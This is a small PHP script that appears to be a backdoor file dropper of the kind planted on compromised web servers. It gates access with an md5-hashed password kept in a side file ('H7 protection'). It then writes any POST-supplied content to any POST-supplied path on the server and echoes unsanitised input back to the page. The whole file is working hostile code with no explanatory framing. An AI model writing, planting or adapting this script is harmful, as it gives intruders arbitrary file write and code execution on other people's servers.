<?php /*14.06.2017
0 - address file 
5 - content 
*/
if(!file_exists('./p.php')){exit('H7 protection');}else{
if('<? /*'.md5($_POST['p']).'*/ ?>'!=file_get_contents('./p.php')){exit('H7 pass no');}}


if(file_exists($_POST['r0']))
	{ 
		echo 'X<h7>'.$_POST['p0'].'<h7>file exists '.$_POST['r0']; 
	}else{
		if(!isset($_POST['r5'])){ $_POST['r5']=' ';}
		$fp = fopen($_POST['r0'], "w");
		fwrite($fp, $_POST['r5']);
		fclose($fp);
		if(file_exists($_POST['r0'])){
			echo 'V';			
		}else{
			echo 'X';
		}
		echo '<h7>'.$_POST['p0'].'<h7>new file '.$_POST['r0'];
	}

?>